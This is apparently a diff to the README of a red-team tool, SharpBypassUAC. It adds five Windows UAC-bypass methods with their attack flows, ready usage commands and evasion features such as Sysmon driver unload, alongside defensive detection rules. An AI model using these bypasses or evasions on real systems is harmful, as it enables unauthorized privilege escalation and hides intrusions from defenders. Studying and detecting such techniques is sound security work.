@@ -25,7 +25,12 @@ No external dependencies. Builds with standalone `csc.exe` (no Visual Studio or 
   - [Environment Variable Hijack — DiskCleanup](#2-environment-variable-hijack--diskcleanup)
   - [File System Primitive Abuse — Intel ShaderCache](#3-file-system-primitive-abuse--intel-shadercache)
   - [COM Elevation — CMSTPLUA](#4-com-elevation--cmstplua)
-  - [Token Impersonation](#5-token-impersonation)
+  - [COM Elevation — ElevatedFactoryServer (UACME #74)](#5-com-elevation--elevatedfactoryserver-uacme-74)
+  - [COM Elevation — DiagCpl Factory (UACME #75)](#6-com-elevation--diagcpl-factory-uacme-75)
+  - [ALPC Debug Object Elevation (UACME #59)](#7-alpc-debug-object-elevation-uacme-59)
+  - [.NET CLR Profiler DLL Hijack (UACME #39)](#8-net-clr-profiler-dll-hijack-uacme-39)
+  - [MSDT / sdiagnhost DLL Hijack (UACME #72)](#9-msdt--sdiagnhost-dll-hijack-uacme-72)
+  - [Token Impersonation](#10-token-impersonation)
 - [Evasion](#evasion)
 - [Detection Guide](#detection-guide)
 - [Architecture](#architecture)
@@ -88,7 +93,7 @@ build.bat
 Or manually:
 
 ```
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /platform:anycpu /optimize+ /unsafe /out:SharpBypassUAC.exe Program.cs W.cs AlwaysNotify.cs FodHelper.cs EventVwr.cs Sdclt.cs ComputerDefaults.cs DiskCleanup.cs Slui.cs CmsTPLua.cs TokenImpersonation.cs IntelShaderCache.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /platform:anycpu /optimize+ /unsafe /out:SharpBypassUAC.exe Program.cs W.cs AlwaysNotify.cs FodHelper.cs EventVwr.cs Sdclt.cs ComputerDefaults.cs DiskCleanup.cs Slui.cs CmsTPLua.cs TokenImpersonation.cs IntelShaderCache.cs ElevatedFactoryServer.cs DiagCpl.cs AlpcDebug.cs DotNetProfiler.cs MsdtDllHijack.cs AntiForensic.cs SysmonEvasion.cs
 ```
 
 ---
@@ -129,6 +134,11 @@ SharpBypassUAC.exe -b <method> -e <base64command>
 | `diskcleanup` | Env variable hijack | windir → SilentCleanup task | Win10+ |
 | `shadercache` | File system + DLL hijack | Junction + symlink → oci.dll | x64, Intel GPU |
 | `cmstp` | COM elevation | CMSTPLUA COM object | Win7+ |
+| `factoryserver` | COM elevation | IElevatedFactoryServer two-step (UACME #74) | Win8.1+ |
+| `diagcpl` | COM elevation | DiagCpl factory COM elevation (UACME #75) | Win7+ |
+| `alpcdebug` | ALPC + debug object | AppInfo RPC + debug object hijack (UACME #59) | Win7+ |
+| `dotnetprofiler` | Env + DLL hijack | COR_PROFILER → mmc.exe loads profiler DLL (UACME #39) | Win7+ |
+| `msdthijack` | DLL search hijack | BluetoothDiagnosticUtil.dll → sdiagnhost (UACME #72) | Win10+ |
 
 **Examples:**
 
@@ -144,6 +154,21 @@ SharpBypassUAC.exe -b diskcleanup -e Y21kLmV4ZSAvYyBjYWxjLmV4ZSAmJiBSRU0=
 
 # File system + DLL hijack — x64 only, requires Intel GPU driver
 SharpBypassUAC.exe -b shadercache -e Y21kLmV4ZSAvYyB3aG9hbWk=
+
+# COM factory elevation — two-step COM indirection (UACME #74)
+SharpBypassUAC.exe -b factoryserver -e Y21kLmV4ZSAvYyB3aG9hbWk=
+
+# DiagCpl factory — alternative factory CLSID (UACME #75)
+SharpBypassUAC.exe -b diagcpl -e Y21kLmV4ZSAvYyB3aG9hbWk=
+
+# ALPC debug object — direct AppInfo RPC elevation (UACME #59)
+SharpBypassUAC.exe -b alpcdebug -e Y21kLmV4ZSAvYyB3aG9hbWk=
+
+# .NET Profiler — COR_PROFILER DLL hijack (UACME #39)
+SharpBypassUAC.exe -b dotnetprofiler -e Y21kLmV4ZSAvYyB3aG9hbWk=
+
+# MSDT DLL hijack — sdiagnhost DLL search path abuse (UACME #72)
+SharpBypassUAC.exe -b msdthijack -e Y21kLmV4ZSAvYyB3aG9hbWk=
 ```
 
 ### Token Impersonation (`-t`) — High → SYSTEM (or other identity)
@@ -494,7 +519,271 @@ The command is parsed as `<file> <arguments>`. For example, `powershell.exe -enc
 
 ---
 
-### 5. Token Impersonation
+### 5. COM Elevation — ElevatedFactoryServer (UACME #74)
+
+#### Theory
+
+Windows COM infrastructure includes **factory server** objects — COM classes designed to create other COM objects on behalf of callers. Some factory servers have `autoElevate=true` in their registration, meaning they can be instantiated at high integrity via the elevation moniker without a UAC prompt.
+
+The `IElevatedFactoryServer` interface exposes a `ServerCreateElevatedObject` method that instantiates an arbitrary COM object in the factory server's elevated context. This creates a **two-step elevation** chain:
+
+1. First elevation: instantiate the factory server itself via `Elevation:Administrator!new:{FactoryServer-CLSID}`
+2. Second elevation: call `ServerCreateElevatedObject` to create another elevated COM object — such as `ICMLuaUtil` — within the factory's context
+
+This effectively bypasses any CLSID-specific monitoring. Even if defenders block direct elevation of `CMSTPLUA`, the factory server creates it indirectly. The factory server's CLSID is a different one (`{A6BFEA43-501F-456F-A845-983D3AD7B8F0}` — VirtualFactoryServer), so CLSID-based detection rules for CMSTPLUA do not trigger.
+
+#### Attack Flow
+
+```
+[Medium Integrity Process]
+     │
+     ├─ CoGetObject("Elevation:Administrator!new:{A6BFEA43-501F-456F-A845-983D3AD7B8F0}")
+     │      │
+     │      └─ COM runtime auto-elevates → returns IElevatedFactoryServer
+     │
+     ├─ IElevatedFactoryServer::ServerCreateElevatedObject(CMSTPLUA_CLSID, IID_ICMLuaUtil)
+     │      │
+     │      └─ Factory creates ICMLuaUtil in elevated context
+     │
+     └─ ICMLuaUtil::ShellExec(command, arguments, ...)
+            │
+            └─ Command runs with HIGH integrity
+```
+
+#### Requirements
+
+- Windows 8.1 through Windows 11 (unfixed as of May 2025)
+- UAC not set to "Always Notify"
+
+#### Advantages
+
+- No registry modification — fully in-memory COM operation
+- Bypasses CLSID-specific monitoring for CMSTPLUA
+- Different `DllHost.exe` commandline CLSID from direct CMSTPLUA elevation
+
+**Based on:** [UACME #74](https://github.com/hfiref0x/UACME/) by [hfiref0x](https://github.com/hfiref0x)
+
+---
+
+### 6. COM Elevation — DiagCpl Factory (UACME #75)
+
+#### Theory
+
+Same two-step COM elevation pattern as ElevatedFactoryServer (#74), but uses a different factory server CLSID: `{12C21EA7-2EB8-4B55-9249-AC243DA8C666}` (DiagCpl factory). This provides an **alternative entry point** — if defenders block one factory CLSID, the other still works.
+
+Both factory servers expose the same `IElevatedFactoryServer` interface and `ServerCreateElevatedObject` method. The only difference is which `DllHost.exe` COM surrogate is spawned.
+
+#### Attack Flow
+
+```
+[Medium Integrity Process]
+     │
+     ├─ CoGetObject("Elevation:Administrator!new:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}")
+     │      │
+     │      └─ COM runtime auto-elevates → returns IElevatedFactoryServer (DiagCpl)
+     │
+     ├─ IElevatedFactoryServer::ServerCreateElevatedObject(CMSTPLUA_CLSID, IID_ICMLuaUtil)
+     │      │
+     │      └─ Factory creates ICMLuaUtil in elevated context
+     │
+     └─ ICMLuaUtil::ShellExec(command, arguments, ...)
+            │
+            └─ Command runs with HIGH integrity
+```
+
+#### Requirements
+
+- Windows 7 through Windows 11 (unfixed as of May 2025)
+- UAC not set to "Always Notify"
+
+**Based on:** [UACME #75](https://github.com/hfiref0x/UACME/) by [hfiref0x](https://github.com/hfiref0x)
+
+---
+
+### 7. ALPC Debug Object Elevation (UACME #59)
+
+#### Theory
+
+This technique exploits the `AppInfo` service — the Windows component that processes UAC elevation requests — by sending it a direct RPC call to launch a process non-elevated, then using **debug objects** to capture the elevated process handle when a second RPC call requests true elevation.
+
+The `AppInfo` service exposes `RAiLaunchAdminProcess` via ALPC RPC (interface UUID `201ef99a-7fa0-444c-9399-19ba84f12a1a`). This function is normally called by the Shell when a user right-clicks "Run as administrator." The key insight is that any process can call this RPC function directly — the consent UI is part of `AppInfo`, not the caller.
+
+The attack proceeds in three phases:
+
+**Phase 1 — Non-elevated launch with debug object:** Call `RAiLaunchAdminProcess` requesting a non-elevated launch of an auto-elevating binary. Before the call, create a debug object and set it as the process's debug object using `NtSetInformationProcess`. This causes the process to halt in a debug state. Detach the debug object and terminate the process — the debug object handle is now associated with future processes spawned through the same debugging infrastructure.
+
+**Phase 2 — Elevated launch capture:** Call `RAiLaunchAdminProcess` again, this time requesting true elevation. The `AppInfo` service creates the elevated process. Because of the debug object set in Phase 1, the elevated process is created with the debug object attached. The attacker can now retrieve the elevated process handle through `NtRemoveProcessDebug`.
+
+**Phase 3 — Parent PID spoofing:** With a handle to the elevated process, call `CreateProcess` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` set to the elevated process handle. The new process inherits the elevated token — running with high integrity.
+
+This technique does not modify the registry, does not use COM elevation, and does not rely on any specific auto-elevating binary's behavior.
+
+#### Attack Flow
+
+```
+[Medium Integrity Process]
+     │
+     ├─ NtCreateDebugObject() → debugObjectHandle
+     │
+     ├─ RAiLaunchAdminProcess(computerdefaults.exe, non-elevated)
+     │      → processHandle (medium integrity)
+     │      NtSetInformationProcess(processHandle, debugObjectHandle)
+     │      NtRemoveProcessDebug(processHandle) → detach
+     │      TerminateProcess(processHandle)
+     │
+     ├─ RAiLaunchAdminProcess(computerdefaults.exe, elevated)
+     │      → AppInfo creates HIGH integrity process
+     │      → Debug object captures elevated handle
+     │
+     ├─ NtRemoveProcessDebug() → get elevated processHandle
+     │
+     └─ CreateProcess(command, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = elevatedHandle)
+            │
+            └─ Command runs with HIGH integrity (inherited from parent)
+```
+
+#### Requirements
+
+- Windows 7 through Windows 11 (unfixed as of May 2025)
+- UAC not set to "Always Notify"
+
+#### Advantages
+
+- No registry modification
+- No COM elevation moniker usage
+- No DLL file drop
+- Extremely difficult to detect — uses the legitimate AppInfo elevation path
+
+#### Limitations
+
+- Complex implementation — requires direct RPC binding to AppInfo via ncalrpc
+- Creates brief intermediate processes (computerdefaults.exe) that may be logged
+
+**Based on:** [UACME #59](https://github.com/hfiref0x/UACME/) by [hfiref0x](https://github.com/hfiref0x)
+
+---
+
+### 8. .NET CLR Profiler DLL Hijack (UACME #39)
+
+#### Theory
+
+The .NET Common Language Runtime (CLR) supports a **profiling API** that loads a profiler DLL into any managed (.NET) process at startup. The profiler is configured through three environment variables:
+
+```
+COR_ENABLE_PROFILING = 1           ← Enable profiler loading
+COR_PROFILER = {GUID}              ← Profiler COM CLSID
+COR_PROFILER_PATH = C:\path\to.dll ← DLL to load as profiler
+```
+
+Windows allows per-user environment variable overrides in `HKCU\Environment`. Values set there are inherited by all new processes started in the user's session after a `WM_SETTINGCHANGE` broadcast notifies the system of the change.
+
+The attack sets these three values to point to an attacker-controlled DLL, then triggers an auto-elevating process that hosts the .NET CLR — specifically, `mmc.exe eventvwr.msc`. When `mmc.exe` auto-elevates and initializes the CLR, it reads the `COR_PROFILER_PATH` variable and loads the attacker's DLL as a profiler — at **high integrity**. The DLL's entry point (`DllMain`) executes the attacker's command.
+
+#### Attack Flow
+
+```
+[Medium Integrity Process]
+     │
+     ├─ CoCreateGuid() → {random-GUID}
+     │
+     ├─ RegSetValueEx(HKCU\Environment, "COR_ENABLE_PROFILING", "1")
+     │  RegSetValueEx(HKCU\Environment, "COR_PROFILER", "{random-GUID}")
+     │  RegSetValueEx(HKCU\Environment, "COR_PROFILER_PATH", "%TEMP%\profiler.dll")
+     │
+     ├─ SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE)
+     │      → All processes pick up new environment variables
+     │
+     ├─ Drop payload DLL to %TEMP%\profiler.dll
+     │      (minimal x64 PE, calls CreateProcessA in DllMain)
+     │
+     ├─ CreateProcess("mmc.exe eventvwr.msc", CREATE_NO_WINDOW)
+     │      │
+     │      └─ mmc.exe auto-elevates → CLR starts → loads COR_PROFILER_PATH
+     │            │
+     │            └─ DllMain runs with HIGH integrity → executes command
+     │
+     └─ Cleanup:
+          Delete COR_* values from HKCU\Environment
+          SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE)
+          Delete profiler DLL (retry-loop, as CLR may hold lock)
+```
+
+#### Requirements
+
+- Windows 7 through Windows 11 (unfixed as of May 2025)
+- UAC not set to "Always Notify"
+- .NET Framework installed (present on all modern Windows)
+
+#### Advantages
+
+- Uses a legitimate .NET framework feature (profiler loading)
+- No COM elevation moniker usage
+- No direct process handle manipulation
+
+#### Limitations
+
+- Brief window (~1–2 seconds) where COR_* values exist in `HKCU\Environment` — detectable by registry monitoring
+- Dropped DLL is visible on disk until cleanup completes
+- `WM_SETTINGCHANGE` broadcast may affect other processes during the attack window
+
+**Based on:** [UACME #39](https://github.com/hfiref0x/UACME/) by [hfiref0x](https://github.com/hfiref0x)
+
+---
+
+### 9. MSDT / sdiagnhost DLL Hijack (UACME #72)
+
+#### Theory
+
+The Microsoft Support Diagnostic Tool (`msdt.exe`) is an auto-elevating binary that launches diagnostic troubleshooting packs. When invoked with a diagnostic path, it spawns `sdiagnhost.exe` (Scripted Diagnostics Host) to execute the diagnostic scripts.
+
+`sdiagnhost.exe` has a **DLL search order vulnerability**: it loads `BluetoothDiagnosticUtil.dll` by name without a full path when processing the Bluetooth diagnostic pack. Windows DLL search order checks the application's directory first, but also checks directories in the `PATH` environment variable — including `%LOCALAPPDATA%\Microsoft\WindowsApps`, which is writable at medium integrity.
+
+By dropping a malicious `BluetoothDiagnosticUtil.dll` into `%LOCALAPPDATA%\Microsoft\WindowsApps` and triggering the Bluetooth diagnostic, the attacker's DLL is loaded into the elevated `sdiagnhost.exe` process.
+
+#### Attack Flow
+
+```
+[Medium Integrity Process]
+     │
+     ├─ Build payload DLL in memory (minimal x64 PE, CreateProcessA in DllMain)
+     │
+     ├─ Write payload to %LOCALAPPDATA%\Microsoft\WindowsApps\BluetoothDiagnosticUtil.dll
+     │
+     ├─ CreateProcess("msdt.exe -path C:\Windows\diagnostics\index\BluetoothDiagnostic.xml -skip yes")
+     │      │
+     │      └─ msdt.exe auto-elevates → launches sdiagnhost.exe (HIGH integrity)
+     │            │
+     │            └─ sdiagnhost loads BluetoothDiagnosticUtil.dll from WindowsApps
+     │                  │
+     │                  └─ DllMain runs with HIGH integrity → executes command
+     │
+     └─ Cleanup:
+          Delete BluetoothDiagnosticUtil.dll (retry-loop, as sdiagnhost may hold lock)
+```
+
+#### Requirements
+
+- Windows 10+ (MSDT with Bluetooth diagnostic pack must be present)
+- UAC not set to "Always Notify"
+
+#### Advantages
+
+- No registry modification
+- No COM elevation moniker usage
+- Simple implementation — single DLL drop + process launch
+- `%LOCALAPPDATA%\Microsoft\WindowsApps` is a legitimate directory in PATH
+
+#### Limitations
+
+- `msdt.exe` may show a brief diagnostic window (hidden via `SW_HIDE`)
+- Dropped DLL visible on disk until cleanup
+- MSDT has been deprecated in recent Windows 11 builds — may not work on latest versions
+
+**Based on:** [UACME #72](https://github.com/hfiref0x/UACME/) by [hfiref0x](https://github.com/hfiref0x)
+
+---
+
+### 10. Token Impersonation
 
 #### Theory
 
@@ -552,7 +841,9 @@ This is not a UAC bypass — it requires the caller to already have local admini
 |-----------|-------------|
 | D/Invoke | Sensitive APIs (`CoGetObject`, `OpenProcess`, `DuplicateTokenEx`, `CreateProcessWithTokenW`, `CreateFileW`, `DeviceIoControl`, `DefineDosDeviceW`) resolved at runtime via `LoadLibrary` + `GetProcAddress` — no static P/Invoke metadata |
 | XOR-encoded strings | API names, DLL names, and registry paths stored as XOR-encoded byte arrays with per-module keys, decoded only at call time |
-| Runtime PE construction | The `shadercache` method builds its payload DLL entirely in memory using `BinaryWriter` — no DLL file is dropped from resources or downloaded |
+| Runtime PE construction | The `shadercache`, `dotnetprofiler`, and `msdthijack` methods build their payload DLL entirely in memory using `BinaryWriter` — no DLL file is dropped from resources or downloaded |
+| Two-step COM indirection | `factoryserver` and `diagcpl` instantiate the target COM object through a factory intermediary — bypasses CLSID-specific detection rules |
+| Direct RPC elevation | `alpcdebug` calls AppInfo RPC directly, bypassing the Shell elevation path — no COM moniker or registry artifact |
 | No external dependencies | Single-file build with `csc.exe`, no NuGet packages or build tools that could be fingerprinted |
 | Registry cleanup | All registry-based bypasses delete their keys after a 10-second delay |
 | Sysmon Driver Unload | `--blind-log`: calls `fltlib.dll!FilterUnload("SysmonDrv")` via D/Invoke — disables Sysmon kernel driver |
@@ -602,6 +893,34 @@ Alert on auto-elevating binaries (`fodhelper.exe`, `eventvwr.exe`, `ComputerDefa
 
 **Sysmon Event ID 1** — Alert on `DllHost.exe` (COM surrogate) spawning unexpected child processes after being invoked with the CMSTPLUA CLSID.
 
+### ElevatedFactoryServer / DiagCpl (UACME #74, #75)
+
+**Sysmon Event ID 1** (Process creation) — Alert on `DllHost.exe` spawned with commandline containing CLSID `{A6BFEA43-501F-456F-A845-983D3AD7B8F0}` (VirtualFactoryServer) or `{12C21EA7-2EB8-4B55-9249-AC243DA8C666}` (DiagCpl factory). These CLSIDs should not appear in normal operations.
+
+**Sysmon Event ID 1** — Alert on `DllHost.exe` spawning unexpected child processes (`cmd.exe`, `powershell.exe`) after loading either factory CLSID.
+
+### ALPC Debug Object (UACME #59)
+
+**Sysmon Event ID 1** (Process creation) — Alert on `computerdefaults.exe` spawning at high integrity without a parent in the Shell (e.g., `explorer.exe`). The `alpcdebug` method launches `computerdefaults.exe` via direct RPC to AppInfo, so the parent process chain differs from normal elevation.
+
+**ETW** — Monitor for `NtCreateDebugObject` and `NtSetInformationProcess` (ProcessDebugObjectHandle class) calls from non-debugger processes. These are unusual API calls outside of development and debugging scenarios.
+
+### .NET Profiler (UACME #39)
+
+**Sysmon Event ID 13** (Registry value set) — Monitor `HKCU\Environment` for creation of `COR_ENABLE_PROFILING`, `COR_PROFILER`, or `COR_PROFILER_PATH` values. These should never exist as persistent user-level environment variables in a normal system.
+
+**Sysmon Event ID 1** (Process creation) — Alert on `mmc.exe eventvwr.msc` launched from an unexpected parent (not `explorer.exe` or `cmd.exe /c mmc`).
+
+**Sysmon Event ID 7** (Image loaded) — Alert on any DLL loaded by `mmc.exe` from `%TEMP%` or other user-writable directories.
+
+### MSDT DLL Hijack (UACME #72)
+
+**Sysmon Event ID 11** (FileCreate) — Monitor `%LOCALAPPDATA%\Microsoft\WindowsApps` for creation of `BluetoothDiagnosticUtil.dll`. This file should not exist in a default installation.
+
+**Sysmon Event ID 1** (Process creation) — Alert on `msdt.exe` launched with `-path` argument containing `BluetoothDiagnostic.xml` and `-skip yes`.
+
+**Sysmon Event ID 7** (Image loaded) — Alert on `sdiagnhost.exe` loading `BluetoothDiagnosticUtil.dll` from `%LOCALAPPDATA%\Microsoft\WindowsApps` instead of `System32`.
+
 ### Token Impersonation
 
 **Sysmon Event ID 10** (ProcessAccess) — Monitor `OpenProcess` calls targeting high-integrity processes (`winlogon.exe`, `lsass.exe`) with `PROCESS_QUERY_LIMITED_INFORMATION` or `PROCESS_QUERY_INFORMATION` access rights.
@@ -638,6 +957,11 @@ SharpBypassUAC/
 ├── DiskCleanup.cs          # Environment variable hijack → SilentCleanup task
 │
 ├── CmsTPLua.cs             # CMSTPLUA COM elevation via D/Invoke
+├── ElevatedFactoryServer.cs # IElevatedFactoryServer two-step COM elevation (UACME #74)
+├── DiagCpl.cs              # DiagCpl factory COM elevation (UACME #75)
+├── AlpcDebug.cs            # ALPC debug object elevation via AppInfo RPC (UACME #59)
+├── DotNetProfiler.cs       # .NET CLR Profiler DLL hijack (UACME #39)
+├── MsdtDllHijack.cs        # MSDT / sdiagnhost DLL hijack (UACME #72)
 ├── IntelShaderCache.cs     # Intel ShaderCache junction + DLL hijack via D/Invoke
 ├── TokenImpersonation.cs   # Token duplication via D/Invoke
 ├── AntiForensic.cs         # ETW patch, Prefetch/ShimCache/BAM wipe, self-delete
@@ -655,3 +979,8 @@ SharpBypassUAC/
 - **diskcleanup**: [enigma0x3](https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/), [gushmazuko](https://github.com/gushmazuko/WinBypass)
 - **shadercache**: Based on [Intel GPU driver ShaderCache directory junction technique](https://mansk1es.gitbook.io/sce-blog/windows-internals/uac-bypass-with-intel-graphics-directory) by mansk1es
 - **CMSTPLUA**: Based on [UACME](https://github.com/hfiref0x/UACME/) project by [hfiref0x](https://github.com/hfiref0x)
+- **ElevatedFactoryServer (UACME #74)**: Based on [UACME](https://github.com/hfiref0x/UACME/) — IElevatedFactoryServer two-step COM elevation by [hfiref0x](https://github.com/hfiref0x)
+- **DiagCpl (UACME #75)**: Based on [UACME](https://github.com/hfiref0x/UACME/) — DiagCpl factory COM elevation by [hfiref0x](https://github.com/hfiref0x)
+- **ALPC Debug Object (UACME #59)**: Based on [UACME](https://github.com/hfiref0x/UACME/) — ALPC debug object elevation by [hfiref0x](https://github.com/hfiref0x)
+- **.NET Profiler (UACME #39)**: Based on [UACME](https://github.com/hfiref0x/UACME/) — COR_PROFILER DLL hijack by [hfiref0x](https://github.com/hfiref0x)
+- **MSDT DLL Hijack (UACME #72)**: Based on [UACME](https://github.com/hfiref0x/UACME/) — sdiagnhost DLL search order hijack by [hfiref0x](https://github.com/hfiref0x)
